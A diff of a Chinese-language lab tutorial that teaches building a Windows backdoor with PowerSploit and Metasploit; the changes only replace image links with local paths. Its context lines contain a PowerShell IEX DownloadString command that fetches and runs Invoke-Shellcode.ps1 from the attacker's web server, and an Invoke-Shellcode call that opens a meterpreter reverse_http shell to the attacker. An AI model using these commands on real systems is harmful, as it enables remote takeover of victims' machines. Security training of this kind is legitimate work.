@@ -27,7 +27,7 @@
 
 在本次实验中，我们仅仅使用 Kali Linux 操作系统中的 PowerSploit 进行 Windows 后门的创建，不会使用 Metasploitable2。由于实验环境中缺少 Windows 主机，所以 Windows 下的木马与主机连接将使用其他方式演示。
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482369801448.png-wm)
+![图片描述](../imgs/1482369801448.png-wm.png)
 
 > 图片引自：http://null-byte.wonderhowto.com
 
@@ -49,12 +49,12 @@ ssh root@Kali
 
 **注意：等 Kali 启动，输入命令后，需要启动时间，所以要等待一段时间，再对 Kali 进行连接，否则会报错。**
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101382249.png-wm)
+![图片描述](../imgs/1481101382249.png-wm.png)
 
 虚拟机 kali Linux 操作系统中的用户 `Kali` 的登录密码为 `toor`，登录成功后，会见到如图所示：
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101646711.png-wm)
+![图片描述](../imgs/1481101646711.png-wm.png)
 
 ## 三、原理介绍
 
@@ -88,10 +88,10 @@ PowerSploit 使用并没有太大的难度，只要熟悉 Linux 的 Shell 就可
 # 进入到脚本所在的文件夹
 cd /usr/share/powersploit
 ```
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482385621301.png-wm)
+![图片描述](../imgs/1482385621301.png-wm.png)
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482386028079.png-wm)
+![图片描述](../imgs/1482386028079.png-wm.png)
 
 在实验楼中，Kali Linux 虚拟机的 IP 地址可以通过命令 `ifconfig` 查看，由图可以知道攻击机 Kali Linux 操作系统的 IP 地址为 `192.168.122.101`。接下来在 Kali 的命令终端中输入如下命令，启动 Web 服务。其中 SimpleHTTPServer 是一个 Python 模块，它的作用是让你瞬间创建一个 Web 服务器或服务在一个单元文件：
 
@@ -101,7 +101,7 @@ cd /usr/share/powersploit
 python -m SimpleHTTPServer
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482387082115.png-wm)
+![图片描述](../imgs/1482387082115.png-wm.png)
 
 在开启了 Python 创建的简单 Web 服务器之后，我们再打开 Kali Linux 下的 Msfconsole 终端，输入如下命令启动 Msfconsole 终端，并且对相应的攻击模块进行配置：
 
@@ -119,7 +119,7 @@ msf > set LPORT 4444
 msf > exploit
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482390669986.png-wm)
+![图片描述](../imgs/1482390669986.png-wm.png)
 
 **由于实验楼环境中并未安装 Windows 虚拟机，所以无法验证实验的有效性。对于完整版的本地演示，可以查看第 4.2 节中 本地 Kali Linux 演示完整版（选看） **
 
@@ -131,7 +131,7 @@ ps > IEX (New-Object Net.WebClient).DownloadString ("http://192.168.192.122.101:
 ```
 即下载服务器 Web 服务网页上的 `Invoke-Shellcode.ps1` 文件：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482390958591.png-wm)
+![图片描述](../imgs/1482390958591.png-wm.png)
 
 接着继续在 Windows 的 PowerShell 中上运行如下命令，创建会话通道：
 
@@ -182,29 +182,29 @@ function Local:Inject-RemoteShellcode ([Int] $ProcessID)
 
 步骤和在实验楼操作的一样，先使用 python 启动 Web 网页服务：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482393737397.png-wm)
+![图片描述](../imgs/1482393737397.png-wm.png)
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482395399204.png-wm)
+![图片描述](../imgs/1482395399204.png-wm.png)
 
 
 接着再打开新的命令行终端，输入命令 `msfconsole` 打开 `Msfconsole`，设置 `PAYLOAD` 以及本地主机 IP 地址 `LHOST` 和本地主机端口号 `LPORT`。最后输入攻击命令 `exploit`，监听目标主机。箭头所指的地方需要替换成攻击者电脑的 IP 地址，由 `ifconfig` 命令可以查看本机 ip 地址。 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482393380008.png-wm)
+![图片描述](../imgs/1482393380008.png-wm.png)
 
 ```
 # 下载脚本文件
 ps > IEX (New-Object Net.WebClient).DownloadString ("http://192.168.192.122.101:8000/CodeExecution/Invoke-Shellcode.ps1 ")
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482395671440.png-wm)
+![图片描述](../imgs/1482395671440.png-wm.png)
 
 ```
 # 创建 session 会话通道
 ps > Invoke-Shellcode -Payload windows/meterpreter/reverse_http -lhost 192.168.122.101 -lport 4444 -Force
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1482396010425.png-wm)
+![图片描述](../imgs/1482396010425.png-wm.png)
 
 PowerSploit 创建 Windows 后门在 Windows 下的两条重要命令如上图所示，第一条命令会创建一个 .Net WebClient Object 用来下载工具，并把它传到 Invoke-Expression 用来将工具映射到内存。第二条命令用于监听者调用 Invoke-Shellcode 工具，创建会话通道。
 
@@ -220,7 +220,7 @@ PowerSploit 创建 Windows 后门在 Windows 下的两条重要命令如上图�
 
 本文介绍的 PowerSploit 创建 Windows 后门主要文章结构为：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1482803879095.png-wm)
+![图片描述](../imgs/1482803879095.png-wm.png)
 
 ## 六、课后作业
 
